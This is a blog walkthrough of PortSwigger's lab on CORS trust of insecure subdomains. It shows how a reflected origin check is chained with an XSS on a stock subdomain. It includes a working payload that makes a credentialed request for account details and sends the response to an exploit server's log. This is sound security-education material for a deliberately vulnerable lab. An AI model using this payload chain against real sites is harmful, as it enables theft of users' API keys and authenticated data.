---
title: PortSwigger Walkthrough - CORS vulnerability with trusted insecure protocols
date: 2026-08-25 20:00:00 +0200
categories: [Walkthrough, PortSwigger]
tags: [walkthrough, portswigger, bscp, cors]
author: diego
description: Walkthrough of PortSwigger's 'CORS vulnerability with trusted insecure protocols' lab.
image:
  path: /assets/img/posts/portswigger/portswigger.png
  alt: PortSwigger Web Security Academy
---

> To browse all labs in this series, visit the [full PortSwigger series](/categories/portswigger/).
{: .prompt-info }

> All testing shown in this series is performed against PortSwigger Academy's intentionally vulnerable labs.  
> Do not apply these techniques to systems you do not own or have explicit written permission to test.
{: .prompt-warning }

## What's this?
This one combines two problems into one lab: a CORS whitelist that trusts all subdomains regardless of protocol (so an HTTP subdomain is treated the same as the HTTPS main domain), and an XSS bug on one of those trusted subdomains. Even a "correctly" scoped CORS config just moves the trust boundary to whatever it allows. If any of the allowed origins has its own vulnerability, that vulnerability now has a path straight into the main app's authenticated data.

## Objective
Same target as the previous two: steal the administrator's API key using the exploit server. Own account: `wiener:peter`.

> [PortSwigger's lab link](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
{: .prompt-info }

## Walkthrough
Log in, grab `GET /accountDetails`, confirm `Access-Control-Allow-Credentials: true` is present. `Origin: https://evil-site.com` gets nothing reflected. Try a subdomain of the lab itself instead:

```
Origin: evil.LAB-ID.web-security-academy.net
```

That one reflects:

![Origin reflected for an arbitrary subdomain](/assets/img/posts/portswigger/cors/05-origin-subdomain.png)

So any subdomain is trusted. Now the question is whether any subdomain has a vulnerability worth abusing. Checking the "Check stock" feature on a product page reveals a request to a `stock.` subdomain, and its `productId` parameter is reflected unescaped, straight into an XSS:

![XSS in the stock subdomain's productId parameter](/assets/img/posts/portswigger/cors/06-xss-cors.png)

Now it's just a matter of chaining the two: use the XSS on the trusted subdomain to run our CORS-stealing script, since anything running on that subdomain gets treated as a trusted origin by the main app. On the exploit server:

```html
<script>
document.location="http://stock.LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

Deliver it, check the access log, grab the administrator's API key, submit it. Lab solved.

![Lab solved confirmation](/assets/img/posts/portswigger/cors/07-lab-solved.png)

The CORS config wasn't even "wrong" in the naive sense, it just extended its trust to a whole subdomain, protocol mismatch and all, and that subdomain turned out to have its own bug. Trusting a domain means trusting everything running on it.

<br><br>
> Wanna talk? Contact me here!  
> <a href="javascript:void(0);" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" onclick="navigator.clipboard.writeText('diegofdlg@gmail.com');alert('Mail copied to the clipboard!')"><i class="fa-solid fa-envelope"></i></a>
> <a href="https://www.linkedin.com/in/diego-fidalgo" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-linkedin"></i></a>
> <a href="https://x.com/0x_ch3ngo" style="font-size:1.2rem; margin-right:0.8rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-x-twitter"></i></a>
> <a href="https://discord.com/users/149616662537043969" style="font-size:1.2rem; margin-top:1rem;" target="_blank"><i class="fa-brands fa-discord"></i></a>
{: .prompt-tip }
